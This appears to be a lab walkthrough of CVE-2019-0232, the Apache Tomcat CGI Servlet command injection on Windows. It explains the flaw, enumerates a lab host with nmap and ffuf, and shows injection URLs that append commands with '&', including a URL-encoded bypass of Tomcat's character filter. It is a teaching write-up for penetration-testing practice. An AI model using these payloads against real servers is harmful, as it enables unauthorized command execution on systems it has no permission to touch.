`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. 

Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing. In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.

The `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments.

The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:

```
        http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Here, the `action` parameter is set to `title`, indicating that the script should search by book title. The `query` parameter specifies the search term "the great gatsby."

If the user wants to search by author, they can use a similar URL:

        http
`http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald`

Here, the `action` parameter is set to `author`, indicating that the script should search by author name. The `query` parameter specifies the search term "fitzgerald."

A problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.

For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server. An example of this is `http://example.com/cgi-bin/hello.bat?&dir`, which passes `&dir` as an argument to `hello.bat` and executes `dir` on the server.

## Enumeration

Scan the target using `nmap`, this will help to pinpoint active services currently operating on the system. This process will provide valuable insights into the target, discovering what services, and potentially which specific versions are running, allowing for a better understanding of its infrastructure and potential vulnerabilities.

#### Nmap - Open Ports
```
        shellsession
tylapcheong@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open

8080/tcp open http-proxy |_http-title: Apache Tomcat/9.0.17 |_http-favicon: Apache Tomcat

```

Here we can see that Nmap has identified `Apache Tomcat/9.0.17` running on port `8080`.

#### Finding a CGI script

One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist. Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` or `http://10.129.204.227:8080/cgi/FUZZ.bat` to perform fuzzing.

#### Fuzzing Extentions - .CMD

        shellsession
`tylapcheong@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd`

Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.

#### Fuzzing Extentions - .BAT

```
        shellsession
`tylapcheong@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat`

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms] * FUZZ: welcome
```

## Exploitation

As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

        http
`http://10.129.204.227:8080/cgi/welcome.bat?&dir`

Navigating to the above URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.

Retrieve a list of environmental variables by calling the `set` command:

        http
`# http://10.129.204.227:8080/cgi/welcome.bat?&set`

```
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
```

From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

        http
`http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`

The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

